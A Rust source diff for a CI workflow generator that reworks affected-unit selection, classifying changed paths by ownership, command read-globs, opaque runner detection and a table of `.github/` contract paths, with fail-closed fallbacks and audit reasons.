@@ -13,8 +13,11 @@
 //!
 //! * [`select_affected`] maps a `git diff --name-status` change list onto the
 //!   watched units. Renames match both sides, deletes still select their
-//!   owner, an unmatched path falls back to the full set, and dependency
-//!   edges are followed across unit kinds.
+//!   owner, and dependency edges are followed across unit kinds. A path no
+//!   watch matches is classified: owned paths (watch, declared reads, or a
+//!   command read-glob) select their owners, provably-unowned paths select
+//!   nothing, and unprovable paths fall back to the full set with the
+//!   consulted sources in the reason.
 //! * [`canonical_fingerprint`] digests everything that can change a unit's
 //!   verdict: source blobs, config, the effective recipe (generator revision
 //!   plus check implementation plus lane commands), reviewed action pins and
@@ -42,16 +45,19 @@ use super::GeneratorError;
 /// rules, or the aggregate verdicts change; digests minted under different
 /// versions never compare equal because the version is part of every hashed
 /// form and every [`current_check_impl`] identity.
-pub(crate) const REUSE_VERSION: u8 = 1;
+pub(crate) const REUSE_VERSION: u8 = 2;
 
 /// The stable aggregate check every repository ruleset gates on. The aggregate
 /// renderers and the ruleset default read this constant instead of spelling
 /// the literal, so the name cannot drift between surfaces.
 pub(crate) const REQUIRED_CHECK: &str = "ci-required";
 
-/// Path prefixes that always select the full set: workflow and CI contract
-/// inputs whose change can redirect any unit.
-pub(crate) const FULL_SELECTION_PREFIXES: &[&str] = &[".github/"];
+/// Caller-provided force-full prefixes for [`select_affected`]: empty. CI
+/// contract paths under `.github/` are classified by [`github_verdict`]
+/// instead of a blanket prefix, so kind reusables narrow by kind and release
+/// lanes select nothing; the parameter stays as an escape hatch for
+/// out-of-tree prefixes a caller must force full.
+pub(crate) const FULL_SELECTION_PREFIXES: &[&str] = &[];
 
 /// The stable check name for one expected work item: a pure function of the
 /// unit id, the lane, and the matrix entry, independent of run ids and
@@ -200,14 +206,25 @@ pub(crate) fn parse_name_status_line(line: &str) -> Option<ChangedPath> {
     })
 }
 
-/// The `(id, watch, depends_on)` view selection needs. The generator projects
-/// it from [`crate::Unit`], the runtime from its own unit table; selection
-/// itself never sees either config type.
+/// The `(id, watch, depends_on)` view selection needs, plus the ownership
+/// inputs classification reads: the unit kind and the lane commands. The
+/// runtime projects it from its own unit table (tests construct it
+/// directly); selection itself never sees the config type. Declared reads
+/// arrive inside `watch` (generation unions them there), so classification
+/// consumes one seam: the final watch vec plus the commands.
 #[derive(Clone, Debug, Eq, PartialEq)]
 pub(crate) struct WatchedUnit {
     pub(crate) id: String,
     pub(crate) watch: Vec<String>,
     pub(crate) depends_on: Vec<String>,
+    /// The unit kind (`rust`, `bun`, ...), empty when the projector does not
+    /// carry it. Only the `node`/`bun` opacity rule reads it; every other
+    /// kind classifies from watch plus commands alone.
+    pub(crate) kind: String,
+    /// The lane commands the unit runs (PR plus full). Read-glob extraction
+    /// scans them for literal glob argv; runner and code-execution detection
+    /// may mark the unit opaque. Empty when the projector carries none.
+    pub(crate) commands: Vec<String>,
 }
 
 /// The affected-selection verdict: `required` must run (changed units, their
@@ -216,24 +233,35 @@ pub(crate) struct WatchedUnit {
 /// reason per selected unit. `fallback_full` marks a full set chosen by
 /// fallback rather than by matching: an empty diff selects nothing with the
 /// flag clear, and the planner records that as explicit no-work.
+/// `fallback_reason` carries the fallback's auditable reason (the consulted
+/// sources for an unprovable path); it is `None` for proven-narrow and empty
+/// selections, `Some` for full fallbacks and for opaque-narrowed selections,
+/// and serializes only when present.
 #[derive(Clone, Debug, Eq, PartialEq, Serialize)]
 pub(crate) struct AffectedSelection {
     pub(crate) required: BTreeSet<String>,
     pub(crate) full_units: BTreeSet<String>,
     pub(crate) fallback_full: bool,
     pub(crate) explanations: BTreeMap<String, String>,
+    #[serde(skip_serializing_if = "Option::is_none")]
+    pub(crate) fallback_reason: Option<String>,
 }
 
 /// Select the units a change list affects.
 ///
 /// A unit is directly selected when any effective match path hits its watch
-/// globs. Dependents of selected units join the full set (a prerequisite
-/// change can break them), and prerequisites of selected units join the
-/// required set (their outputs must exist before the run). Edges are followed
-/// across unit kinds: a cross-language dependency invalidates exactly like a
-/// same-language one. An unmatched path, a global-prefix path, or a duplicate
-/// unit id falls back to the full set — or fails, for the duplicate id — so an
-/// input the model cannot prove narrow never silently skips verification.
+/// globs (which include generation-time declared reads) or its extracted
+/// command read-globs, or when a changed kind reusable names its kind.
+/// Dependents of selected units join the full set (a prerequisite change can
+/// break them), and prerequisites of selected units join the required set
+/// (their outputs must exist before the run). Edges are followed across unit
+/// kinds: a cross-language dependency invalidates exactly like a
+/// same-language one. A path no unit owns selects only the opaque units
+/// (whose unprovable commands may read it), or nothing when every unit is
+/// transparent; a global-prefix path, an unmatchable path, a
+/// CI-contract-unknown path, or a duplicate unit id falls back to the full
+/// set — or fails, for the duplicate id — so an input the model cannot prove
+/// narrow never silently skips verification.
 ///
 /// # Errors
 ///
@@ -259,6 +287,7 @@ pub(crate) fn select_affected(
             full_units: BTreeSet::new(),
             fallback_full: false,
             explanations: BTreeMap::new(),
+            fallback_reason: None,
         });
     }
     if let Some(path) = candidates
@@ -270,31 +299,131 @@ pub(crate) fn select_affected(
                 .any(|prefix| path.starts_with(prefix))
         })
     {
-        return Ok(fallback_selection(
-            units,
-            &format!("global path `{path}` selects every unit"),
-        ));
+        let reason = format!("global path `{path}` selects every unit");
+        return Ok(fallback_selection(units, &reason));
     }
-    let compiled = build_watch_matchers(units)?;
-    let hits = match match_changes(&compiled, &candidates) {
-        Ok(hits) => hits,
-        Err(path) => {
-            return Ok(fallback_selection(
-                units,
-                &format!("unmatched path `{path}` selects every unit"),
-            ));
+    let compiled = compile_ownership(units)?;
+    let mut hits: BTreeMap<&str, Vec<String>> = BTreeMap::new();
+    let mut kind_hits: BTreeMap<&str, Vec<String>> = BTreeMap::new();
+    let mut opaque_reasons: Vec<String> = Vec::new();
+    for candidate in &candidates {
+        if let Some(verdict) = github_verdict(candidate.path) {
+            match verdict {
+                GithubVerdict::Global { reason } | GithubVerdict::Unknown { reason } => {
+                    return Ok(fallback_selection(units, &reason));
+                }
+                GithubVerdict::Kind { kind } => {
+                    for unit in compiled
+                        .iter()
+                        .filter(|compiled| compiled.unit.kind.eq_ignore_ascii_case(&kind))
+                        .map(|compiled| compiled.unit.id.as_str())
+                    {
+                        kind_hits.entry(unit).or_default().push(format!(
+                            "kind reusable `{}` ({})",
+                            candidate.path,
+                            candidate.kind.verb()
+                        ));
+                    }
+                }
+                GithubVerdict::ReleaseScope => {}
+            }
+            continue;
         }
-    };
-    let direct: BTreeSet<String> = hits.keys().map(ToString::to_string).collect();
+        match classify_path(&compiled, candidate.path) {
+            PathVerdict::Owned { units: owners } => {
+                let item = format!("`{}` ({})", candidate.path, candidate.kind.verb());
+                record_path_hits(&compiled, &mut hits, &owners, &item);
+            }
+            PathVerdict::Opaque {
+                units: opaque_units,
+                reason,
+            } => {
+                let item = format!(
+                    "`{}` ({}; opaque fallback)",
+                    candidate.path,
+                    candidate.kind.verb()
+                );
+                record_path_hits(&compiled, &mut hits, &opaque_units, &item);
+                opaque_reasons.push(reason);
+            }
+            PathVerdict::Unknown { reason } => {
+                return Ok(fallback_selection(units, &reason));
+            }
+            PathVerdict::Irrelevant => {}
+        }
+    }
+    let mut selection = finish_selection(units, &hits, &kind_hits);
+    selection.fallback_reason = join_opaque_reasons(opaque_reasons);
+    Ok(selection)
+}
+
+/// Attribute one changed path to its units: every named unit joins the direct
+/// hits with the preformatted item, so owned and opaque-narrowed matches share
+/// one attribution loop.
+fn record_path_hits<'a>(
+    compiled: &[CompiledUnit<'a>],
+    hits: &mut BTreeMap<&'a str, Vec<String>>,
+    ids: &BTreeSet<String>,
+    item: &str,
+) {
+    for id in ids {
+        let Some(matched) = compiled
+            .iter()
+            .find_map(|compiled| (compiled.unit.id == *id).then_some(compiled.unit.id.as_str()))
+        else {
+            continue;
+        };
+        hits.entry(matched).or_default().push(item.to_owned());
+    }
+}
+
+/// Join collected opaque-narrowing reasons into the additive fallback reason:
+/// [`None`] when no opaque fallback widened the selection, else the sorted,
+/// deduplicated reasons joined for the audit trail.
+#[must_use]
+pub(crate) fn join_opaque_reasons(mut opaque_reasons: Vec<String>) -> Option<String> {
+    if opaque_reasons.is_empty() {
+        return None;
+    }
+    opaque_reasons.sort();
+    opaque_reasons.dedup();
+    Some(opaque_reasons.join("; "))
+}
+
+/// Expand direct path hits across `depends_on` edges and explain every
+/// selected unit: direct matches name their paths, kind-narrowed matches
+/// name the reusable, and closure members name the edge that pulled them in.
+fn finish_selection(
+    units: &[WatchedUnit],
+    hits: &BTreeMap<&str, Vec<String>>,
+    kind_hits: &BTreeMap<&str, Vec<String>>,
+) -> AffectedSelection {
+    let direct: BTreeSet<String> = hits
+        .keys()
+        .chain(kind_hits.keys())
+        .map(ToString::to_string)
+        .collect();
     let closure = expand_selection_closure(units, &direct);
     let mut explanations = BTreeMap::new();
-    for (id, items) in &hits {
+    for (id, items) in hits {
         let mut items = items.clone();
         items.sort();
         explanations.insert(
             (*id).to_owned(),
             format!("matched changed path {}", items.join(", ")),
         );
+    }
+    for (id, items) in kind_hits {
+        let mut items = items.clone();
+        items.sort();
+        let attribution = format!("via {}", items.join(", "));
+        explanations
+            .entry((*id).to_owned())
+            .and_modify(|existing| {
+                existing.push(' ');
+                existing.push_str(&attribution);
+            })
+            .or_insert_with(|| format!("matched changed path {attribution}"));
     }
     for (id, parents) in &closure.affected_by {
         explanations.insert(
@@ -314,23 +443,129 @@ pub(crate) fn select_affected(
             ),
         );
     }
-    Ok(AffectedSelection {
+    AffectedSelection {
         required: closure.required,
         full_units: closure.full_units,
         fallback_full: false,
         explanations,
-    })
+        fallback_reason: None,
+    }
 }
 
-/// One unit's compiled watch globs.
-type CompiledWatch<'a> = (&'a WatchedUnit, GlobSet);
+/// The unit kinds whose scanners cannot prove a complete read set: package
+/// scripts and bundlers may consume files no watch names. Until the scan
+/// proves whole-root ownership for these units, any command beyond the
+/// provably-pure no-ops marks the unit opaque, and paths no unit owns select
+/// the opaque units instead of nothing.
+fn is_opaque_kind(kind: &str) -> bool {
+    kind.eq_ignore_ascii_case("node") || kind.eq_ignore_ascii_case("bun")
+}
 
-/// Compile every unit's watch globs.
+/// Commands that provably read nothing: the no-ops. A unit whose every
+/// command is pure (or which carries no commands) cannot own an unmatched
+/// path, so it never forces fallback.
+const PURE_COMMANDS: &[&str] = &["true", "false", ":"];
+
+/// Commands that execute repository code or package tasks, whose read set is
+/// unprovable without running them. Any token whose trailing `/`-segment
+/// (after stripping surrounding quotes and subshell opens) equals one of
+/// these marks the unit opaque, so a path-spelled runner (`/usr/bin/make`)
+/// matches its bare name. Matching is deliberately token-literal: no shell
+/// parsing, no extension inference — a miss would skip verification, so an
+/// ambiguous token fails closed elsewhere instead.
+const OPAQUE_RUNNERS: &[&str] = &[
+    "bun",
+    "npm",
+    "yarn",
+    "pnpm",
+    "node",
+    "npx",
+    "deno",
+    "python",
+    "python3",
+    "mise",
+    "make",
+    "just",
+    "task",
+    "sh",
+    "bash",
+    "dash",
+    "zsh",
+    "fish",
+    "pwsh",
+    "powershell",
+    "cmd",
+    "xargs",
+];
+
+/// The `cargo`/`mbx` subcommands whose reads the scan's watch sets bound:
+/// exactly the generator's emitted vocabulary (verification, the workspace
+/// gate, and the dependency-policy unit). Any other subcommand — `run`,
+/// `xtask`, a future recipe the conformance table does not list — may
+/// execute project code with reads no watch names, so it marks the unit
+/// opaque. `mbx` shares the vocabulary: the generator substitutes it 1:1
+/// for `cargo` without changing the subcommand.
+const TRANSPARENT_CARGO_SUBCOMMANDS: &[&str] =
+    &["fmt", "clippy", "test", "nextest", "check", "deny", "audit"];
+
+/// The unit kinds the generator renders, as the `ci-unit-<kind>.yml`
+/// reusable filenames spell them. A reusable naming any other kind has
+/// unproven impact and falls back to full.
+const KNOWN_KINDS: &[&str] = &[
+    "rust", "gradle", "node", "bun", "swift", "opentofu", "docker", "homebrew", "docs",
+];
+
+/// What command analysis proved about one unit: literal read-globs (and
+/// ignore-globs) extracted from argv, or opacity with its cause. Opacity is
+/// per unit, never per path: an opaque unit joins the conservative selection
+/// for paths no unit owns (the full set only when every unit is opaque),
+/// while owned paths still narrow to their owners.
+struct CommandReads {
+    positives: Vec<String>,
+    negatives: Vec<String>,
+    opaque: bool,
+    opaque_reason: Option<String>,
+}
+
+impl CommandReads {
+    fn clear() -> Self {
+        Self {
+            positives: Vec::new(),
+            negatives: Vec::new(),
+            opaque: false,
+            opaque_reason: None,
+        }
+    }
+
+    fn mark_opaque(&mut self, reason: String) {
+        self.opaque = true;
+        if self.opaque_reason.is_none() {
+            self.opaque_reason = Some(reason);
+        }
+    }
+}
+
+/// One unit's compiled ownership inputs: its watch globs, its extracted
+/// read/ignore globs, and whether its commands resisted proof.
+pub(crate) struct CompiledUnit<'a> {
+    unit: &'a WatchedUnit,
+    watch: GlobSet,
+    positives: GlobSet,
+    negatives: GlobSet,
+    opaque: bool,
+    opaque_reason: Option<String>,
+}
+
+/// Compile every unit's watch globs plus its command read-globs.
 ///
 /// # Errors
 ///
-/// Returns a usage error for an invalid watch pattern.
-fn build_watch_matchers(units: &[WatchedUnit]) -> Result<Vec<CompiledWatch<'_>>, GeneratorError> {
+/// Returns a usage error for an invalid watch pattern. An unreadable
+/// extracted glob never errors: the unit goes opaque instead, so the path
+/// selects conservatively rather than failing the plan.
+pub(crate) fn compile_ownership(
+    units: &[WatchedUnit],
+) -> Result<Vec<CompiledUnit<'_>>, GeneratorError> {
     let mut compiled = Vec::with_capacity(units.len());
     for unit in units {
         let mut builder = GlobSetBuilder::new();
@@ -343,39 +578,503 @@ fn build_watch_matchers(units: &[WatchedUnit]) -> Result<Vec<CompiledWatch<'_>>,
             })?;
             builder.add(glob);
         }
-        let set = builder
+        let watch = builder
             .build()
             .map_err(|error| GeneratorError::usage(format!("build watch matcher: {error}")))?;
-        compiled.push((unit, set));
+        let mut reads = analyze_commands(&unit.id, &unit.kind, &unit.commands);
+        let mut positives = GlobSetBuilder::new();
+        for pattern in std::mem::take(&mut reads.positives) {
+            match Glob::new(&pattern) {
+                Ok(glob) => {
+                    positives.add(glob);
+                }
+                Err(_) => reads.mark_opaque(format!(
+                    "unit `{}` declares an unreadable command read-glob `{pattern}`",
+                    unit.id
+                )),
+            }
+        }
+        let mut negatives = GlobSetBuilder::new();
+        for pattern in std::mem::take(&mut reads.negatives) {
+            match Glob::new(&pattern) {
+                Ok(glob) => {
+                    negatives.add(glob);
+                }
+                Err(_) => reads.mark_opaque(format!(
+                    "unit `{}` declares an unreadable command ignore-glob `{pattern}`",
+                    unit.id
+                )),
+            }
+        }
+        let positives = positives
+            .build()
+            .map_err(|error| GeneratorError::usage(format!("build read-glob matcher: {error}")))?;
+        let negatives = negatives
+            .build()
+            .map_err(|error| GeneratorError::usage(format!("build read-glob matcher: {error}")))?;
+        compiled.push(CompiledUnit {
+            unit,
+            watch,
+            positives,
+            negatives,
+            opaque: reads.opaque,
+            opaque_reason: reads.opaque_reason,
+        });
     }
     Ok(compiled)
 }
 
-/// Match every candidate path against the compiled watches: the unit ids each
-/// path selects, with the rendered match per unit. The first unmatched path
-/// fails with itself so the caller falls back to the full set.
-fn match_changes<'a>(
-    compiled: &[CompiledWatch<'a>],
-    candidates: &[EffectiveMatch<'_>],
-) -> Result<BTreeMap<&'a str, Vec<String>>, String> {
-    let mut hits: BTreeMap<&str, Vec<String>> = BTreeMap::new();
-    for candidate in candidates {
-        let mut hit = false;
-        for (unit, set) in compiled {
-            if set.is_match(candidate.path) {
-                hits.entry(unit.id.as_str()).or_default().push(format!(
-                    "`{}` ({})",
-                    candidate.path,
-                    candidate.kind.verb()
-                ));
-                hit = true;
+/// The ownership verdict for one changed path: its owners, the opaque units
+/// an unmatched path conservatively selects, unprovability with the consulted
+/// sources in the reason, or proven irrelevance.
+pub(crate) enum PathVerdict {
+    Owned {
+        units: BTreeSet<String>,
+    },
+    Opaque {
+        units: BTreeSet<String>,
+        reason: String,
+    },
+    Unknown {
+        reason: String,
+    },
+    Irrelevant,
+}
+
+/// Classify one changed path against the compiled units: owned when any
+/// unit's watch or read-globs match, opaque when no unit owns it but some
+/// (not every) unit is opaque, unknown when the path itself resists matching
+/// or every unit is opaque (narrowing is impossible), irrelevant otherwise.
+/// Owned wins over opaque: a proven owner selects its units even when
+/// another unit's commands resist proof.
+pub(crate) fn classify_path(compiled: &[CompiledUnit<'_>], path: &str) -> PathVerdict {
+    if path.is_empty() {
+        return PathVerdict::Unknown {
+            reason: "empty changed path selects every unit \
+                (consulted declared reads, watch globs, command read-globs; \
+                an empty path cannot be matched safely)"
+                .to_owned(),
+        };
+    }
+    if path.starts_with('"') {
+        return PathVerdict::Unknown {
+            reason: format!(
+                "quoted path `{path}` selects every unit (consulted declared reads, \
+                watch globs, command read-globs; a quoted diff path cannot be matched safely)"
+            ),
+        };
+    }
+    let mut owners = BTreeSet::new();
+    let mut opaque = BTreeSet::new();
+    let mut causes = Vec::new();
+    for unit in compiled {
+        if unit.watch.is_match(path) || extraction_owns(unit, path) {
+            owners.insert(unit.unit.id.clone());
+        } else if unit.opaque {
+            opaque.insert(unit.unit.id.clone());
+            if let Some(cause) = unit.opaque_reason.as_deref() {
+                causes.push(cause);
             }
         }
-        if !hit {
-            return Err(candidate.path.to_owned());
+    }
+    if !owners.is_empty() {
+        return PathVerdict::Owned { units: owners };
+    }
+    if opaque.is_empty() {
+        return PathVerdict::Irrelevant;
+    }
+    let detail = if causes.is_empty() {
+        "every consulted unit is opaque".to_owned()
+    } else {
+        causes.join("; ")
+    };
+    let missing = missing_contract_hint(&opaque, path);
+    if opaque.len() == compiled.len() {
+        return PathVerdict::Unknown {
+            reason: format!(
+                "unmatched path `{path}` selects every unit (consulted declared reads, \
+                watch globs, command read-globs; {detail}; {missing})"
+            ),
+        };
+    }
+    PathVerdict::Opaque {
+        units: opaque,
+        reason: format!(
+            "unmatched path `{path}` selects only opaque units (consulted declared reads, \
+            watch globs, command read-globs; {detail}; {missing})"
+        ),
+    }
+}
+
+/// The missing-contract hint an unmatched path appends to its reason: the
+/// `reads` keys whose entries would narrow the path, so unknown impact
+/// reports the exact contract to declare instead of only the consulted
+/// sources. Unmatchable paths (empty, quoted) carry no hint — no contract
+/// can cover a path the matcher cannot spell.
+fn missing_contract_hint(opaque: &BTreeSet<String>, path: &str) -> String {
+    let keys = opaque
+        .iter()
+        .map(|unit| format!("`{unit}`"))
+        .collect::<Vec<_>>()
+        .join(", ");
+    let units = if opaque.len() == 1 { "unit" } else { "units" };
+    format!(
+        "missing contract: declare `reads` entries (type \"paths\", \"script\", or \"unresolved\") \
+        for {units} {keys} covering `{path}` to narrow"
+    )
+}
+
+/// Whether a unit's extracted read-globs own a path: some positive matches
+/// the path or any parent-relative suffix (the command may run below the
+/// repository root, where the same argv reads a rooted path), unless an
+/// ignore-glob matches the path and every suffix. Suffix matching
+/// over-approximates (sound: a claim without an actual read only selects
+/// more), while the all-suffix negation rule keeps ignores sound under an
+/// unknown working directory.
+fn extraction_owns(unit: &CompiledUnit<'_>, path: &str) -> bool {
+    if !path_suffixes(path)
+        .iter()
+        .any(|suffix| unit.positives.is_match(suffix))
+    {
+        return false;
+    }
+    !path_suffixes(path)
+        .iter()
+        .all(|suffix| unit.negatives.is_match(suffix))
+}
+
+/// The path plus every `/`-boundary suffix: `"a/b/c"` yields `"a/b/c"`,
+/// `"b/c"`, `"c"`.
+fn path_suffixes(path: &str) -> Vec<&str> {
+    let mut suffixes = vec![path];
+    let mut rest = path;
+    while let Some((_, tail)) = rest.split_once('/') {
+        suffixes.push(tail);
+        rest = tail;
+    }
+    suffixes
+}
+
+/// Analyze one unit's commands into extracted read-globs plus opacity.
+/// Extraction is token-literal, never shell parsing: tokens split on
+/// whitespace and `;`, one `KEY=VALUE` split, one surrounding-quote strip.
+/// Anything the scan cannot prove — runners, code execution, a bare
+/// repo-relative script path, expansion syntax, root escapes, unquoted or
+/// unbalanced glob tokens — marks the unit opaque with its cause instead of
+/// guessing. Opacity never blocks narrowing: a changed path the watch
+/// (including generation-time declared reads) or a read-glob owns still
+/// selects its owners, so declared coverage of a script's inputs keeps the
+/// unit narrow on those inputs.
+fn analyze_commands(unit_id: &str, kind: &str, commands: &[String]) -> CommandReads {
+    let mut reads = CommandReads::clear();
+    if is_opaque_kind(kind)
+        && commands
+            .iter()
+            .filter_map(|command| split_tokens(command).into_iter().next())
+            .any(|first| !PURE_COMMANDS.contains(&runner_name(first)))
+    {
+        reads.mark_opaque(format!(
+            "unit `{unit_id}` ({kind}) runs package commands the scan cannot prove; \
+            package scripts and bundlers may read files no watch names"
+        ));
+    }
+    for command in commands {
+        if command
+            .bytes()
+            .any(|byte| byte == b'$' || byte == b'`' || byte == b'\\')
+        {
+            reads.mark_opaque(format!(
+                "unit `{unit_id}` runs a command with expansion or escape syntax \
+                the extractor refuses to parse"
+            ));
+            continue;
+        }
+        let tokens: Vec<&str> = split_tokens(command);
+        let cleaned: Vec<&str> = tokens.iter().map(|token| runner_name(token)).collect();
+        if cleaned
+            .iter()
+            .any(|name| *name == "cargo" || *name == "mbx")
+            && cleaned.contains(&"run")
+            && !cleaned
+                .windows(2)
+                .any(|pair| (pair[0] == "cargo" || pair[0] == "mbx") && pair[1] == "nextest")
+        {
+            reads.mark_opaque(format!(
+                "unit `{unit_id}` executes project code via a `run` command"
+            ));
+        }
+        for (index, name) in cleaned.iter().enumerate() {
+            if *name != "cargo" && *name != "mbx" {
+                continue;
+            }
+            let subcommand = cleaned.get(index + 1).copied().unwrap_or("");
+            if !TRANSPARENT_CARGO_SUBCOMMANDS.contains(&subcommand) {
+                reads.mark_opaque(format!(
+                    "unit `{unit_id}` runs `{name}` with subcommand `{subcommand}` \
+                    outside the audited vocabulary, whose read set is unprovable"
+                ));
+            }
+        }
+        for token in tokens {
+            if token.contains("..") {
+                reads.mark_opaque(format!(
+                    "unit `{unit_id}` runs a command escaping the repository root (`..`)"
+                ));
+                break;
+            }
+            let name = runner_name(token);
+            if OPAQUE_RUNNERS.contains(&name) {
+                reads.mark_opaque(format!(
+                    "unit `{unit_id}` executes `{name}`, whose read set is unprovable"
+                ));
+                break;
+            }
+            match extract_glob_token(token) {
+                TokenGlobs::None => {
+                    let cleaned = strip_token(token);
+                    if !is_quoted(token) && names_repo_relative_path(cleaned) {
+                        reads.mark_opaque(format!(
+                            "unit `{unit_id}` executes `{cleaned}`, whose read set is unprovable"
+                        ));
+                        break;
+                    }
+                    if names_absolute_path(cleaned) {
+                        reads.mark_opaque(format!(
+                            "unit `{unit_id}` touches `{cleaned}`, which the scan cannot bound"
+                        ));
+                        break;
+                    }
+                }
+                TokenGlobs::Positive(glob) => reads.positives.push(glob),
+                TokenGlobs::Negative(glob) => reads.negatives.push(glob),
+                TokenGlobs::Unprovable => {
+                    reads.mark_opaque(format!(
+                        "unit `{unit_id}` runs a command with argv the extractor \
+                        cannot prove (`{token}`)"
+                    ));
+                    break;
+                }
+            }
         }
     }
-    Ok(hits)
+    reads
+}
+
+/// Strip subshell opens and one layer of surrounding quotes for runner-name
+/// comparison. This is literal cleanup, not parsing: leftovers simply miss
+/// the runner table (and the glob extractor fails them closed separately).
+fn strip_token(token: &str) -> &str {
+    let token = token.trim_start_matches('(');
+    if token.len() >= 2 {
+        let bytes = token.as_bytes();
+        let (Some(first), Some(last)) = (bytes.first(), bytes.last()) else {
+            return token;
+        };
+        if (*first == b'\'' || *first == b'"') && first == last {
+            return &token[1..token.len() - 1];
+        }
+    }
+    token
+}
+
+/// Split a lane command into argv tokens: whitespace plus `;`, so a
+/// `;`-joined command (`cd x;make`) analyzes as the sequence the shell runs.
+/// This is literal splitting, not parsing: a `;` inside quotes splits too,
+/// and the unbalanced halves fail closed through the glob extractor.
+fn split_tokens(command: &str) -> Vec<&str> {
+    command
+        .split(|character: char| character.is_whitespace() || character == ';')
+        .filter(|token| !token.is_empty())
+        .collect()
+}
+
+/// The runner name of one argv token: the trailing `/`-segment after the
+/// literal quote cleanup, so `/usr/bin/make` matches the `make` runner.
+fn runner_name(token: &str) -> &str {
+    let cleaned = strip_token(token);
+    cleaned.rsplit('/').next().unwrap_or(cleaned)
+}
+
+/// Whether one argv token carries surrounding quotes (after subshell opens):
+/// quoted literals are data the scan and declared reads own, never executed
+/// script paths.
+fn is_quoted(token: &str) -> bool {
+    let token = token.trim_start_matches('(');
+    let bytes = token.as_bytes();
+    token.len() >= 2
+        && (bytes[0] == b'\'' || bytes[0] == b'"')
+        && bytes[0] == bytes[token.len() - 1]
+}
+
+/// Whether a cleaned token names a repo-relative path: it spells a `/`
+/// without being absolute, a flag, or an assignment. Such a bare token is an
+/// executed script or a directly consumed file whose read set the scan
+/// cannot bound, so it marks the unit opaque; declared reads still narrow
+/// the unit on the inputs they cover, because owned paths win over opacity.
+fn names_repo_relative_path(cleaned: &str) -> bool {
+    cleaned.contains('/')
+        && !cleaned.starts_with('/')
+        && !cleaned.starts_with('-')
+        && !cleaned.contains('=')
+}
+
+/// Whether a cleaned token names an absolute path: it starts with `/`
+/// without being an assignment. The scan only bounds repository-relative
+/// reads, so an absolute path is either executed code or data outside the
+/// repository the scan cannot see; either way the unit goes opaque.
+/// Quoted or not: `"/opt/x/run.sh"` executes exactly like the bare form.
+fn names_absolute_path(cleaned: &str) -> bool {
+    cleaned.starts_with('/') && !cleaned.contains('=')
+}
+
+/// What one argv token proved: no glob, a positive read-glob, a `#`-prefixed
+/// ignore-glob, or nothing provable.
+enum TokenGlobs {
+    None,
+    Positive(String),
+    Negative(String),
+    Unprovable,
+}
+
+/// Whether a token carries glob metacharacters.
+fn has_glob_chars(token: &str) -> bool {
+    token.contains(['*', '?', '[', ']'])
+}
+
+/// Extract a literal glob from one argv token: the `VALUE` of `KEY=VALUE`
+/// (else the whole token) must be cleanly quoted to count as a glob, and a
+/// `#`-prefixed quoted glob is an ignore-glob. Literal tokens prove
+/// nothing either way (literals are the scan's and declared reads' job);
+/// unquoted glob characters and unbalanced quotes are unprovable.
+fn extract_glob_token(token: &str) -> TokenGlobs {
+    let (key, value) = match token.split_once('=') {
+        Some((key, value)) => (key, value),
+        None => ("", token),
+    };
+    if key.contains(['\'', '"']) || has_glob_chars(key) {
+        return TokenGlobs::Unprovable;
+    }
+    if value.is_empty() {
+        return TokenGlobs::None;
+    }
+    let Ok((inner, quoted)) = dequote(value) else {
+        return TokenGlobs::Unprovable;
+    };
+    if let Some(negated) = inner.strip_prefix('#') {
+        if !quoted {
+            if has_glob_chars(inner) {
+                return TokenGlobs::Unprovable;
+            }
+            return TokenGlobs::None;
+        }
+        if !has_glob_chars(negated) {
+            return TokenGlobs::None;
+        }
+        return TokenGlobs::Negative(negated.to_owned());
+    }
+    if !has_glob_chars(inner) {
+        return TokenGlobs::None;
+    }
+    if !quoted {
+        return TokenGlobs::Unprovable;
+    }
+    TokenGlobs::Positive(inner.to_owned())
+}
+
+/// Strip one layer of surrounding quotes, returning the inner text and
+/// whether it was quoted. Anything ambiguous — a quote char with no match,
+/// an unmatched opener or closer, the same quote nested inside — fails so
+/// the caller marks the unit opaque instead of guessing.
+fn dequote(token: &str) -> Result<(&str, bool), ()> {
+    let bytes = token.as_bytes();
+    let (Some(first), Some(last)) = (bytes.first(), bytes.last()) else {
+        return Ok((token, false));
+    };
+    let opens = *first == b'\'' || *first == b'"';
+    let closes = *last == b'\'' || *last == b'"';
+    if !opens && !closes {
+        if token.contains(['\'', '"']) {
+            return Err(());
+        }
+        return Ok((token, false));
+    }
+    if !opens || !closes || first != last || token.len() < 2 {
+        return Err(());
+    }
+    let inner = &token[1..token.len() - 1];
+    if inner.contains(*first as char) {
+        return Err(());
+    }
+    Ok((inner, true))
+}
+
+/// The CI-contract classification for one `.github/` path: global inputs
+/// that stay full, kind reusables that narrow to the named kind, release
+/// and maintenance lanes that select nothing in affected scope, and
+/// everything else unknown (fail-closed with its reason).
+pub(crate) enum GithubVerdict {
+    Global { reason: String },
+    Kind { kind: String },
+    ReleaseScope,
+    Unknown { reason: String },
+}
+
+/// Classify one `.github/` path, or return [`None`] for any other path.
+/// Four global classes stay full (the scheduling aggregates, the policy
+/// gate plus its config, the plan input, and the toolchain action every job
+/// uses); kind reusables narrow by filename kind; release and maintenance
+/// lanes select nothing outside their own scope; the reporting action, the
+/// contract docs, and every unlisted contract path stay unknown.
+pub(crate) fn github_verdict(path: &str) -> Option<GithubVerdict> {
+    const GLOBAL_FILES: &[&str] = &[
+        "workflows/ci-pr.yml",
+        "workflows/ci-main.yml",
+        "workflows/nightly.yml",
+        "workflows/preview.yml",
+        "workflows/ci-policy.yml",
+        "actionlint.yaml",
+        "ci/project.toml",
+    ];
+    if !path.starts_with(".github/") {
+        return None;
+    }
+    let rest = &path[".github/".len()..];
+    if GLOBAL_FILES.contains(&rest) {
+        return Some(GithubVerdict::Global {
+            reason: format!("global path `{path}` selects every unit"),
+        });
+    }
+    if rest.starts_with("actions/setup-velnor-workflow/") {
+        return Some(GithubVerdict::Global {
+            reason: format!("global path `{path}` selects every unit"),
+        });
+    }
+    if let Some(file) = rest.strip_prefix("workflows/") {
+        if let Some(kind) = file
+            .strip_prefix("ci-unit-")
+            .and_then(|name| name.strip_suffix(".yml"))
+            && KNOWN_KINDS.contains(&kind)
+        {
+            return Some(GithubVerdict::Kind {
+                kind: kind.to_owned(),
+            });
+        }
+        if matches!(
+            file,
+            "ci-runtime-products.yml"
+                | "ci-release-package-signer.yml"
+                | "release.yml"
+                | "maintenance.yml"
+        ) {
+            return Some(GithubVerdict::ReleaseScope);
+        }
+    }
+    Some(GithubVerdict::Unknown {
+        reason: format!(
+            "CI contract path `{path}` has unproven impact (consulted the CI-contract \
+            classification table); selects every unit"
+        ),
+    })
 }
 
 /// The dependency closure of the directly changed units: `required` must run
